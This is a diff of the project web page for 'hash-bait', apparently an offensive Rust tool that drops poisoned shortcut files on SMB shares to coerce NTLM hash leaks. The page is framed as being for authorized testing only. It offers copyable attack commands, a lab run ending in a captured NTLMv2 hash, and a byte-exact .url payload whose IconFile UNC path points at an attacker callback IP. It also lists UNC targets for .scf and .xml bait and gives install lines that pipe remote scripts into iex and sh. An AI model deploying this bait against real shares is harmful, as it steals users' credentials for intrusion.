@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>hash-bait: drop poisoned shortcuts on SMB shares to coerce NTLM hashes</title>
+<title>hash-bait — SMB share trap and NTLM coercion CLI</title>
 <meta name="description" content="Drop poisoned shortcuts on SMB shares to coerce NTLM hashes">
 <link rel="canonical" href="https://real-fruit-snacks.github.io/hash-bait/">
 <meta property="og:title" content="hash-bait">
@@ -22,158 +22,712 @@
 <meta name="color-scheme" content="dark">
 <meta name="theme-color" content="#050507">
 <link rel="preload" href="fonts/big-shoulders-stencil-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="fonts/albert-sans-latin.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="fonts/azeret-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
 <script>
-    // Dark (LX 263) default; opt-in light (LX 512) synced via rfs-theme and color-scheme across RFS pages.
-    (function (d) {
-        try {
-            var t = localStorage.getItem('rfs-theme') || localStorage.getItem('color-scheme');
-            if (t === 'light' || t === 'dayshift') d.dataset.theme = 'light';
-        } catch (e) {}
-        if (window.matchMedia && matchMedia('(prefers-reduced-motion: no-preference)').matches) d.classList.add('js-run');
-    })(document.documentElement);
+  // Dark (LX 263) explicit default; opt-in light (LX 512) synced via rfs-theme and color-scheme across RFS pages.
+  (function (d) {
+    try {
+      var t = localStorage.getItem('rfs-theme') || localStorage.getItem('color-scheme');
+      if (t === 'light' || t === 'dayshift') {
+        d.dataset.theme = 'light';
+        var cs = document.querySelector('meta[name="color-scheme"]');
+        if (cs) cs.content = 'light';
+        var tc = document.querySelector('meta[name="theme-color"]');
+        if (tc) tc.content = '#F5F7F9';
+      }
+    } catch (e) {}
+  })(document.documentElement);
 </script>
 <link rel="stylesheet" href="rfs.css">
 <link rel="stylesheet" href="rfs-components.css">
 <link rel="stylesheet" href="styles.css">
 </head>
-<body class="rfs-shell is-bait">
-<a class="rfs-skip" href="#install">Skip to the install line</a>
+<body class="rfs-shell hb-app">
+<a class="rfs-skip" href="#workbench">Skip to coercion workbench</a>
 
-<header class="rfs-shell-header top">
-    <div class="wrap top-inner">
-        <a class="brand" href="https://real-fruit-snacks.github.io/">
-            <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
-            <span class="brand-text">HASH-BAIT</span>
-        </a>
-        <nav class="top-nav" aria-label="Links">
-            <a href="#what">What's in it</a>
-            <a href="#tested">Tested on</a>
-            <a href="#issues">Known issues</a>
-            <a href="https://github.com/Real-Fruit-Snacks/hash-bait">GitHub</a>
-        </nav>
-        <button class="theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
-            <span class="theme-dot" aria-hidden="true"></span>
-            <span class="t-dark">LX 263 DARK</span>
-            <span class="t-light">LX 512 LIGHT</span>
-        </button>
-    </div>
+<header class="rfs-shell-header hb-header">
+  <div class="hb-wrap hb-header-inner">
+    <a class="hb-brand" href="https://real-fruit-snacks.github.io/" aria-label="Real-Fruit-Snacks home — hash-bait">
+      <img class="hb-brand-tile" src="icon.svg" alt="" width="28" height="28">
+      <span class="hb-brand-name">HASH-BAIT</span>
+      <span class="hb-brand-org" aria-hidden="true">/ RFS</span>
+    </a>
+
+    <nav class="hb-nav" aria-label="Page sections">
+      <a href="#workbench">Workbench</a>
+      <a href="#commands">Subcommands</a>
+      <a href="#formats">Payloads</a>
+      <a href="#verification">Verification</a>
+      <a href="https://github.com/Real-Fruit-Snacks/hash-bait">GitHub</a>
+    </nav>
+
+    <button class="hb-theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
+      <span class="hb-theme-chip" aria-hidden="true"></span>
+      <span class="hb-t-dark">LX 263 DARK</span>
+      <span class="hb-t-light">LX 512 LIGHT</span>
+    </button>
+  </div>
 </header>
 
-<div class="rfs-scroll-region page-scroll" id="page-scroll">
-<main class="wrap stack">
-<section class="card first" aria-labelledby="top-h">
-    <p class="runhead"><b>hash-bait 1.0.1</b><span>Windows · Linux · macOS</span><span>Rust, one static binary</span><span>MIT</span></p>
-    <div class="hero">
-        <div>
-            <h1 class="title" id="top-h">hash-bait</h1>
-            <p class="lead">Drop poisoned shortcuts on SMB shares to coerce NTLM hashes</p>
-            <p class="sub">I got tired of doing this in three tools — one to write the bait files, smbclient to push them, Responder to catch the hashes — and of picking bait out of client shares by hand afterwards. hash-bait is the whole errand as one static binary: it renders <code>.url</code>/<code>.scf</code>/<code>.xml</code> payloads, puts them on the share with its own SMB2/3 stack (no smbclient, no Python), starts Responder, and cleans up after itself. It assumes you have written authorization for the target and a Linux listener on the network. For authorized security testing only.</p>
-            <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
-                <li id="install" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Install</span><span class="ld" aria-hidden="true"></span><span class="rs">Run once</span>
-                    <div class="act"><div class="cmd"><code>irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex</code><button class="copy" type="button" data-copy="irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex">Copy</button></div>
-                    <div class="cmd"><code>curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh</code><button class="copy" type="button" data-copy="curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh">Copy</button></div></div>
-                    <p class="why">PowerShell on Windows, the shell line on Linux or macOS. Each downloads the binary for your platform from the <a href="https://github.com/Real-Fruit-Snacks/hash-bait/releases/latest">latest release</a> and puts it on your PATH; safe to re-run to upgrade. The binaries are not signed — the release page's <code>SHA256SUMS.txt</code> is what you check.</p></li>
-                <li data-step="2" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Shares</span><span class="ld" aria-hidden="true"></span><span class="rs">Enumerated</span></li>
-                <li data-step="3" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Bait</span><span class="ld" aria-hidden="true"></span><span class="rs">Dropped</span></li>
-                <li data-step="4" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Hash</span><span class="ld" aria-hidden="true"></span><span class="rs">Captured</span></li>
-                <li data-step="5" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Share</span><span class="ld" aria-hidden="true"></span><span class="rs">Cleaned</span></li>
-            </ol>
-            <p class="closeout">Nothing left on the share</p>
+<div class="rfs-scroll-region hb-scroll" id="page-scroll">
+<main>
+  <!-- Editorial Masthead Band -->
+  <section class="hb-masthead" aria-labelledby="top-h">
+    <div class="hb-wrap hb-masthead-grid">
+      <div class="hb-masthead-copy">
+        <div class="hb-meta-row" aria-label="Release metadata">
+          <span class="rfs-badge b-beacon"><span class="k">[v]</span> 1.0.1</span>
+          <span class="rfs-badge b-steel"><span class="k">[lang]</span> RUST</span>
+          <span class="rfs-badge"><span class="k">[os]</span> WINDOWS · LINUX</span>
+          <span class="rfs-badge b-warn"><span class="k">[scope]</span> AUTHORIZED TESTING</span>
         </div>
 
-        <figure class="display" aria-labelledby="session-cap">
-            <div class="screenbox">
-                <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
-<pre class="screen" id="screen" tabindex="0" aria-label="A hash-bait run: enumerate shares, drop bait, catch a hash, clean up"><code><span class="ln"><span class="p">$</span> <span class="t">hash-bait list -t dc1 -u svc-reader</span></span>
-<span class="ln o">ADMIN$	Remote Admin</span>
-<span class="ln o">C$	Default share</span>
-<span class="ln o">IPC$	Remote IPC</span>
-<span class="ln o">public	drop zone</span>
-<span class="ln" data-step="2"><span class="s">[ok]</span> 4 share(s) on dc1</span>
+        <h1 class="hb-title" id="top-h">HASH-BAIT</h1>
+        <hr class="rfs-divider-horizon hb-title-rule">
 
-<span class="ln"><span class="p">$</span> <span class="t">hash-bait drop -t dc1 -c 10.10.14.7 -s public -u svc-reader -i eth0</span></span>
-<span class="ln" data-step="3"><span class="s">[ok]</span> dropped 3 payload(s) on //dc1/public</span>
-<span class="ln"><span class="i">[i]</span> starting Responder on eth0 — Ctrl-C to stop</span>
-<span class="ln o">[+] Listening for events...</span>
-<span class="ln o">[SMB] NTLMv2-SSP Client   : 10.10.11.23</span>
-<span class="ln o">[SMB] NTLMv2-SSP Username : LAB\jdoe</span>
-<span class="ln a" data-step="4">[SMB] NTLMv2-SSP Hash     : jdoe::LAB:4d6f…c21a</span>
+        <p class="hb-tagline">Drop poisoned shortcuts on SMB shares to coerce NTLM hashes</p>
+        <p class="hb-intro">One static binary replaces the three-tool errand: render <code>.url</code>, <code>.scf</code>, and <code>.xml</code> bait files, upload and remove them over a pure-Rust SMB2/3 stack (no <code>smbclient</code>, no Python), and hand off to Responder on Linux. Assumes explicit written authorization for every target share.</p>
+      </div>
 
-<span class="ln"><span class="p">$</span> <span class="t">hash-bait clean -t dc1 -s public -u svc-reader</span></span>
-<span class="ln" data-step="5"><span class="s">[ok]</span> removed 3 payload(s) from //dc1/public</span>
+      <aside class="hb-install-col" aria-label="Install hash-bait">
+        <div class="rfs-code-card hb-install-card">
+          <div class="rfs-code-head">
+            <span class="rfs-badge b-beacon"><span class="k">[shell]</span> INSTALL</span>
+            <span class="rfs-code-head-meta">STATIC BINARY · MIT</span>
+          </div>
 
-<span class="ln end"><span class="p">$</span> <span class="cursor"></span></span></code></pre>
+          <div class="hb-install-row">
+            <div class="hb-install-label">
+              <span>Windows · PowerShell</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-horizon hb-copy-btn" command="--copy" commandfor="cmd-install-ps" aria-label="Copy Windows PowerShell install command">Copy</button>
             </div>
-            <figcaption id="session-cap">
-                <p class="cap">A scripted run against a throwaway lab DC, with the tool's own output; the password came from <code>$HASH_BAIT_PASSWORD</code>, so no prompt is shown. The three <code>[SMB]</code> lines are Responder's own output with the hash shortened, and the <code>clean</code> ran in a second window after the hash landed.</p>
-                <button class="replay" type="button" data-replay="screen" hidden>Replay</button>
-            </figcaption>
-        </figure>
-    </div>
-</section>
+            <pre class="hb-install-pre"><code id="cmd-install-ps"><span class="rfs-tok-fn">irm</span> <span class="rfs-tok-str">https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1</span> | <span class="rfs-tok-kw">iex</span></code></pre>
+          </div>
 
-<section class="card ref" id="what" aria-labelledby="what-h">
-    <h2 id="what-h">What's in it</h2>
-    <p class="intro">Four subcommands cover the whole errand. <code>drop</code> and <code>clean</code> take <code>--dry-run</code> to print the plan with no side effects, and every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set.</p>
-    <div class="cols">
-        <ul class="ck spec">
-            <li><span class="ch">Drop the bait</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>drop</code></span>
-                <p class="why">Renders <code>@bait.url</code>, <code>@bait.scf</code> and <code>@bait.xml</code> pointing at your callback address and writes them to the share over its own SMB2/3 stack. Starts Responder afterwards unless <code>--no-listen</code>. The leading <code>@</code> sorts the files to the top of Explorer's view; <code>-d</code> targets a subdirectory when the share root is read-only.</p></li>
-            <li><span class="ch">Clean up</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>clean</code></span>
-                <p class="why">Removes previously dropped bait, matched by basename, and warns about any file already gone. Leaving bait on a client's share is how engagements end badly.</p></li>
-            <li><span class="ch">Find the shares</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>list</code></span>
-                <p class="why">Enumerates shares on a target over IPC$ + srvsvc: one line per share, with its remark when the server gives one. Windows only for now — see known issues.</p></li>
-        </ul>
-        <ul class="ck spec">
-            <li><span class="ch">Catch the hashes</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
-                <p class="why">Starts Responder on an interface (Linux only) so the coerced authentications land somewhere. On any other platform it says so and exits 4.</p></li>
-            <li><span class="ch">Authenticated sessions</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-u</code></span>
-                <p class="why"><code>-u svc-reader</code>, <code>-u LAB/svc-reader</code> or <code>-u svc-reader@LAB.LOCAL</code>, with the password from <code>$HASH_BAIT_PASSWORD</code> or an <code>--ask-pass</code> prompt. No username at all tries a guest session — best-effort, see known issues.</p></li>
-            <li><span class="ch">Pick the payloads</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-p</code></span>
-                <p class="why">Repeatable: <code>-p url -p scf -p xml</code> (or <code>-p all</code>, the default) for any subset, and <code>--name</code> changes the <code>@bait</code> basename when the default is burned. <code>--save-local</code> also writes copies in the current folder for inspection.</p></li>
-        </ul>
-    </div>
-</section>
+          <div class="hb-install-row">
+            <div class="hb-install-label">
+              <span>Linux · macOS</span>
+              <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="cmd-install-sh" aria-label="Copy Linux and macOS shell install command">Copy</button>
+            </div>
+            <pre class="hb-install-pre"><code id="cmd-install-sh"><span class="rfs-tok-fn">curl</span> <span class="rfs-tok-kw">-fsSL</span> <span class="rfs-tok-str">https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh</span> | <span class="rfs-tok-kw">sh</span></code></pre>
+          </div>
 
-<section class="card ref" id="tested" aria-labelledby="tested-h">
-    <h2 id="tested-h">Tested on</h2>
-    <p class="intro">Every check below runs on every commit; the pipeline is public in the repo. What hasn't been run says so.</p>
-    <div class="cols">
-        <ul class="ck" aria-label="Checks run">
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Unit, golden and CLI tests</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">18 tests on the build host (Windows 11, stable Rust) and in CI on windows-2022 and ubuntu-24.04, with <code>cargo fmt --check</code> and <code>clippy -D warnings</code>. The golden tests pin the three payload bodies byte-for-byte against the original tool's output.</p></li>
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">A live Windows share, in CI</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">The windows-2022 job creates a local user and share, then runs an authenticated <code>drop</code>, <code>list</code> and <code>clean</code> against 127.0.0.1, asserting the three bait files appear and the share is left empty.</p></li>
-        </ul>
-        <ul class="ck" aria-label="More checks">
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">A live Samba share, in CI</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">The ubuntu-24.04 job stands up Samba with a real user and asserts authenticated <code>drop</code> and <code>clean</code>. <code>list</code> and the anonymous drop run as informational probes — both fail today for crate reasons, below.</p></li>
-            <li data-state="open"><span class="box" aria-hidden="true"></span><span class="ch">macOS</span><span class="ld" aria-hidden="true"></span><span class="rs">Not run</span>
-                <p class="why">Cross-compiled for aarch64 and x86_64 on every release, unsigned and untested; probably works, no promises. First run needs <code>xattr -d com.apple.quarantine</code> on the binary.</p></li>
-        </ul>
+          <div class="hb-install-foot">
+            <span>Or build with <code>cargo install --path .</code> · Unsigned releases; verify <code>SHA256SUMS.txt</code> on the <a class="rfs-link-prose" href="https://github.com/Real-Fruit-Snacks/hash-bait/releases/latest">latest release</a>.</span>
+          </div>
+        </div>
+      </aside>
     </div>
-</section>
+  </section>
 
-<section class="card ref limits" id="issues" aria-labelledby="issues-h">
-    <h2 id="issues-h">Known issues</h2>
-    <ul class="plain">
-        <li><code>listen</code> needs Responder, which only runs on Linux. On Windows it explains and exits 4; the usual split is <code>drop --no-listen</code> from anywhere, <code>hash-bait listen</code> on the Kali box.</li>
-        <li>Anonymous drops are guest sessions — the Rust SMB stack can't express a true null session, so <code>guest</code> + empty password is the portable equivalent. Against servers that accept the session before SSPI completes (Samba <code>map to guest</code>, most NAS devices) the <code>smb</code> crate errors with "SMB session setup succeeded before SSPI authentication completed" — a crate limitation, not fixable from here. Authenticated drops are the tested path; default Windows refuses guest either way.</li>
-        <li><code>list</code> is Windows-only for now. Share enumeration binds DCE/RPC offering only the NDR64 transfer syntax; Windows accepts it, Samba's srvsvc endpoint rejects it. Until the crate learns classic NDR, <code>list</code> fails loudly against Samba and NAS targets while <code>drop</code>/<code>clean</code> work fine.</li>
-        <li><code>--pass</code> is visible in the process list. Prefer <code>--ask-pass</code> or <code>$HASH_BAIT_PASSWORD</code>.</li>
-        <li>Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; <code>SHA256SUMS.txt</code> comes from the same release as the binaries it checks.</li>
-    </ul>
-</section>
+  <!-- Hero Centerpiece: 3-Stage SMB Share Coercion Workbench -->
+  <section class="hb-section hb-bench-section" id="workbench" aria-labelledby="wb-h">
+    <div class="hb-wrap">
+      <div class="hb-section-head">
+        <div>
+          <span class="hb-eyebrow">INTERACTIVE SIMULATOR · LAB BENCH</span>
+          <h2 class="hb-h2" id="wb-h">SMB Share Coercion Workbench</h2>
+        </div>
+        <p class="hb-section-lead">Toggle payload types, stage bait on a writable share, trigger a browsing client, inspect the exact golden bytes, and clean the share back to zero.</p>
+      </div>
+
+      <div class="hb-bench" data-phase="staged" id="hb-bench">
+        <div class="hb-bench-bar">
+          <div class="hb-bar-group" role="group" aria-label="Active payload formats">
+            <span class="hb-bar-label">Payloads</span>
+            <button type="button" class="rfs-chip hb-payload-toggle" data-payload="url" aria-pressed="true">
+              <span class="k" aria-hidden="true">[x]</span><span>.url</span>
+            </button>
+            <button type="button" class="rfs-chip hb-payload-toggle" data-payload="scf" aria-pressed="true">
+              <span class="k" aria-hidden="true">[x]</span><span>.scf</span>
+            </button>
+            <button type="button" class="rfs-chip hb-payload-toggle" data-payload="xml" aria-pressed="true">
+              <span class="k" aria-hidden="true">[x]</span><span>.xml</span>
+            </button>
+          </div>
+
+          <div class="hb-bar-telemetry" aria-label="Simulated lab parameters">
+            <span class="rfs-badge b-steel"><span class="k">[cb]</span> 10.10.14.5</span>
+            <span class="rfs-badge"><span class="k">[share]</span> \\dc1\public</span>
+          </div>
+
+          <div class="hb-bar-actions">
+            <button type="button" class="rfs-btn rfs-btn-horizon hb-action-btn" id="btn-drop">
+              <svg class="rfs-icon rfs-icon-sm" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 15.5V4.5"/><path d="M7.5 9L12 4.5 16.5 9"/><path d="M4 19.5h16"/></svg>
+              <span>Drop bait</span>
+            </button>
+            <button type="button" class="rfs-btn rfs-btn-steel hb-action-btn" id="btn-browse">
+              <svg class="rfs-icon rfs-icon-sm" viewBox="0 0 24 24" aria-hidden="true"><path d="M2.5 12S6 6.25 12 6.25 21.5 12 21.5 12 18 17.75 12 17.75 2.5 12 2.5 12z"/><circle cx="12" cy="12" r="2.75"/></svg>
+              <span>Simulate browse</span>
+            </button>
+            <button type="button" class="rfs-btn rfs-btn-fault-outline hb-action-btn" id="btn-clean">
+              <svg class="rfs-icon rfs-icon-sm" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 6.5h16"/><path d="M9 6.5V4h6v2.5"/><path d="M6.5 6.5l1 13.5h9l1-13.5"/><path d="M10.25 10.5v6"/><path d="M13.75 10.5v6"/></svg>
+              <span>Clean share</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- 3-Stage Pipeline Grid -->
+        <div class="hb-stages">
+          <!-- Stage 1: Writable Share -->
+          <section class="hb-stage" id="stage-share" aria-labelledby="stage-share-h">
+            <header class="hb-stage-head">
+              <div class="hb-stage-title-wrap">
+                <span class="hb-stage-num">01</span>
+                <div>
+                  <h3 class="hb-stage-title" id="stage-share-h">Writable Share</h3>
+                  <p class="hb-stage-sub"><code>\\dc1\public</code></p>
+                </div>
+              </div>
+              <span class="rfs-badge b-warn" id="share-status-badge"><span class="k">[staged]</span> 3 files</span>
+            </header>
+
+            <div class="hb-stage-body">
+              <div class="hb-browse-banner" id="browse-banner" hidden>
+                <span class="rfs-badge b-beacon"><span class="k">[browse]</span> LAB\jdoe</span>
+                <span id="browse-banner-text">10.10.11.23 opened <code>\\dc1\public</code> in Explorer</span>
+              </div>
+
+              <div class="hb-share-grid" id="share-grid" aria-label="Files currently on share">
+                <button type="button" class="hb-file-tile" data-file="url" aria-label="Inspect @bait.url payload bytes">
+                  <span class="hb-file-top">
+                    <svg class="rfs-icon rfs-icon-sm rfs-icon-beacon" viewBox="0 0 24 24" aria-hidden="true"><path d="M4.5 3.5h9.5L19.5 9v11.5h-15V3.5z"/><path d="M14 3.5V9h5.5"/><path d="M10.25 13L8.25 15l2 2"/><path d="M13.75 13l2 2-2 2"/></svg>
+                    <span class="hb-file-name">@bait.url</span>
+                    <span class="hb-file-size">108 B</span>
+                  </span>
+                  <span class="hb-file-meta">
+                    <span class="rfs-badge b-beacon"><span class="k">[icon]</span> Explorer browse</span>
+                    <span class="hb-file-unc">\\10.10.14.5\%USERNAME%.icon</span>
+                  </span>
+                </button>
+
+                <button type="button" class="hb-file-tile" data-file="scf" aria-label="Inspect @bait.scf payload bytes">
+                  <span class="hb-file-top">
+                    <svg class="rfs-icon rfs-icon-sm rfs-icon-warn" viewBox="0 0 24 24" aria-hidden="true"><path d="M4.5 3.5h9.5L19.5 9v11.5h-15V3.5z"/><path d="M14 3.5V9h5.5"/><path d="M10.25 13L8.25 15l2 2"/><path d="M13.75 13l2 2-2 2"/></svg>
+                    <span class="hb-file-name">@bait.scf</span>
+                    <span class="hb-file-size">85 B</span>
+                  </span>
+                  <span class="hb-file-meta">
+                    <span class="rfs-badge b-warn"><span class="k">[icon]</span> Legacy Explorer</span>
+                    <span class="hb-file-unc">\\10.10.14.5\tools\nc.ico</span>
+                  </span>
+                </button>
+
+                <button type="button" class="hb-file-tile" data-file="xml" aria-label="Inspect @bait.xml payload bytes">
+                  <span class="hb-file-top">
+                    <svg class="rfs-icon rfs-icon-sm rfs-icon-steel" viewBox="0 0 24 24" aria-hidden="true"><path d="M4.5 3.5h9.5L19.5 9v11.5h-15V3.5z"/><path d="M14 3.5V9h5.5"/><path d="M10.25 13L8.25 15l2 2"/><path d="M13.75 13l2 2-2 2"/></svg>
+                    <span class="hb-file-name">@bait.xml</span>
+                    <span class="hb-file-size">164 B</span>
+                  </span>
+                  <span class="hb-file-meta">
+                    <span class="rfs-badge b-steel"><span class="k">[xsl]</span> Word open</span>
+                    <span class="hb-file-unc">\\10.10.14.5\lure.xsl</span>
+                  </span>
+                </button>
+              </div>
+
+              <div class="rfs-state-box is-empty hb-share-empty" id="share-empty" hidden>
+                <span class="rfs-badge b-ok"><span class="k">[empty]</span> SHARE CLEAN</span>
+                <p class="hb-empty-copy">No <code>@bait.*</code> files remain on <code>//dc1/public</code>.</p>
+                <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline" id="btn-redrop">Drop selected bait again</button>
+              </div>
+
+              <p class="hb-stage-note">Leading <code>@</code> sorts files to the top of Explorer listings. Click any tile to inspect its exact bytes below.</p>
+            </div>
+          </section>
+
+          <!-- Stage 2: Coercion Signal & Live CLI Builder -->
+          <section class="hb-stage hb-stage-mid" id="stage-cli" aria-labelledby="stage-cli-h">
+            <header class="hb-stage-head">
+              <div class="hb-stage-title-wrap">
+                <span class="hb-stage-num">02</span>
+                <div>
+                  <h3 class="hb-stage-title" id="stage-cli-h">Coercion &amp; Live CLI</h3>
+                  <p class="hb-stage-sub">Verified against <code>src/cli.rs</code></p>
+                </div>
+              </div>
+              <span class="rfs-badge b-steel" id="cli-mode-badge"><span class="k">[cmd]</span> drop</span>
+            </header>
+
+            <div class="hb-stage-body">
+              <div class="rfs-code-card hb-cli-card">
+                <div class="rfs-code-head">
+                  <span class="rfs-badge b-beacon"><span class="k">[shell]</span> GENERATED CLI</span>
+                  <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="wb-cli-code" aria-label="Copy generated hash-bait command">Copy</button>
+                </div>
+                <pre class="rfs-code-block hb-cli-pre"><code id="wb-cli-code"><span class="rfs-tok-fn">hash-bait</span> <span class="rfs-tok-kw">drop</span> <span class="rfs-tok-kw">-t</span> <span class="rfs-tok-str">dc1</span> <span class="rfs-tok-kw">-s</span> <span class="rfs-tok-str">public</span> <span class="rfs-tok-kw">-c</span> <span class="rfs-tok-str">10.10.14.5</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-str">url</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-str">scf</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-str">xml</span> <span class="rfs-tok-kw">-i</span> <span class="rfs-tok-str">eth0</span> <span class="rfs-tok-kw">-u</span> <span class="rfs-tok-str">svc-reader</span></code></pre>
+              </div>
+
+              <div class="hb-conduit" id="wb-conduit" aria-label="Coercion packet route">
+                <div class="hb-conduit-node">
+                  <span class="hb-conduit-k">SHARE</span>
+                  <span class="hb-conduit-v">//dc1/public</span>
+                </div>
+                <div class="hb-conduit-track" aria-hidden="true">
+                  <span class="hb-conduit-bar"></span>
+                  <span class="hb-conduit-proto" id="conduit-proto">SMB2/3 · TCP 445</span>
+                </div>
+                <div class="hb-conduit-node">
+                  <span class="hb-conduit-k">CALLBACK</span>
+                  <span class="hb-conduit-v">10.10.14.5</span>
+                </div>
+              </div>
+
+              <div class="hb-trace-box" aria-label="Verbatim hash-bait status trace">
+                <div class="hb-trace-head">
+                  <span>STATUS TRACE</span>
+                  <span>NO_COLOR SAFE</span>
+                </div>
+                <pre class="hb-trace-pre" id="wb-trace" role="status" aria-live="polite"><span class="hb-tok-ok">[ok]</span> dropped 3 payload(s) on //dc1/public
+<span class="hb-tok-info">[i]</span> starting Responder on eth0 — Ctrl-C to stop</pre>
+              </div>
+
+              <p class="hb-stage-note">Password comes from <code>$HASH_BAIT_PASSWORD</code> (or <code>--ask-pass</code>). Omit <code>-p</code> to default to <code>all</code>.</p>
+            </div>
+          </section>
+
+          <!-- Stage 3: Responder Capture Panel -->
+          <section class="hb-stage" id="stage-responder" aria-labelledby="stage-responder-h">
+            <header class="hb-stage-head">
+              <div class="hb-stage-title-wrap">
+                <span class="hb-stage-num">03</span>
+                <div>
+                  <h3 class="hb-stage-title" id="stage-responder-h">Responder Capture</h3>
+                  <p class="hb-stage-sub">Kali · NetNTLMv2</p>
+                </div>
+              </div>
+              <span class="rfs-badge b-steel" id="resp-status-badge"><span class="k">[i]</span> LISTENING</span>
+            </header>
+
+            <div class="hb-stage-body">
+              <div class="rfs-code-card hb-resp-card">
+                <div class="rfs-code-head">
+                  <span class="rfs-badge b-steel"><span class="k">[eth0]</span> RESPONDER -WV</span>
+                  <span class="rfs-code-head-meta" id="resp-meta">WAITING ON :445</span>
+                </div>
+                <pre class="rfs-code-block hb-resp-pre" id="wb-responder"><span class="rfs-tok-com">[i] sudo responder -I eth0 -wv</span>
+<span class="rfs-tok-kw">[+]</span> Listening for events on <span class="rfs-tok-num">10.10.14.5:445</span>...
+<span class="rfs-tok-com">[i] Waiting for a user to browse \\dc1\public</span></pre>
+              </div>
+
+              <dl class="rfs-kv hb-resp-kv" id="resp-kv">
+                <div class="rfs-kv-row">
+                  <dt>Client IP</dt>
+                  <dd id="kv-client">Waiting for SMB auth</dd>
+                </div>
+                <div class="rfs-kv-row">
+                  <dt>Account</dt>
+                  <dd id="kv-user">—</dd>
+                </div>
+                <div class="rfs-kv-row">
+                  <dt>Share Hygiene</dt>
+                  <dd id="kv-hygiene">3 bait file(s) staged</dd>
+                </div>
+              </dl>
+            </div>
+          </section>
+        </div>
+
+        <!-- Golden Payload Byte Inspector -->
+        <div class="hb-inspector" id="inspector" aria-labelledby="inspector-h">
+          <div class="hb-inspector-head">
+            <div class="hb-inspector-title-group">
+              <h3 class="hb-inspector-title" id="inspector-h">Golden Payload Byte Inspector</h3>
+              <span class="hb-inspector-sub">Byte-exact output from <code>src/payloads.rs</code> &amp; <code>tests/golden/*</code> for <code>@bait</code> → <code>10.10.14.5</code> (LF)</span>
+            </div>
+
+            <div class="rfs-tablist hb-tablist" role="tablist" focusgroup="tablist nomemory" aria-label="Payload byte formats">
+              <button type="button" role="tab" id="tab-url" data-tab="url" aria-selected="true" focusgroupstart tabindex="0">
+                <span>@bait.url</span>
+                <span class="hb-tab-size">108 B</span>
+              </button>
+              <button type="button" role="tab" id="tab-scf" data-tab="scf" aria-selected="false" tabindex="-1">
+                <span>@bait.scf</span>
+                <span class="hb-tab-size">85 B</span>
+              </button>
+              <button type="button" role="tab" id="tab-xml" data-tab="xml" aria-selected="false" tabindex="-1">
+                <span>@bait.xml</span>
+                <span class="hb-tab-size">164 B</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="hb-panels">
+            <div role="tabpanel" id="panel-url" aria-labelledby="tab-url" tabindex="0">
+              <div class="hb-panel-inner">
+                <div class="rfs-code-card">
+                  <div class="rfs-code-head">
+                    <div class="hb-code-head-left">
+                      <span class="rfs-badge b-beacon"><span class="k">[url]</span> @bait.url</span>
+                      <span class="rfs-code-head-meta">108 BYTES · LF · ICONFILE UNC</span>
+                    </div>
+                    <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline hb-copy-btn" command="--copy" commandfor="payload-code-url" aria-label="Copy @bait.url payload contents">Copy</button>
+                  </div>
+                  <pre class="rfs-code-block"><code id="payload-code-url"><span class="rfs-tok-kw">[InternetShortcut]</span>
+<span class="rfs-tok-fn">URL</span>=<span class="rfs-tok-str">whatever</span>
+<span class="rfs-tok-fn">WorkingDirectory</span>=<span class="rfs-tok-str">whatever</span>
+<span class="rfs-tok-fn">IconFile</span>=<span class="rfs-tok-str">\\10.10.14.5\%USERNAME%.icon</span>
+<span class="rfs-tok-fn">IconIndex</span>=<span class="rfs-tok-num">1</span></code></pre>
+                </div>
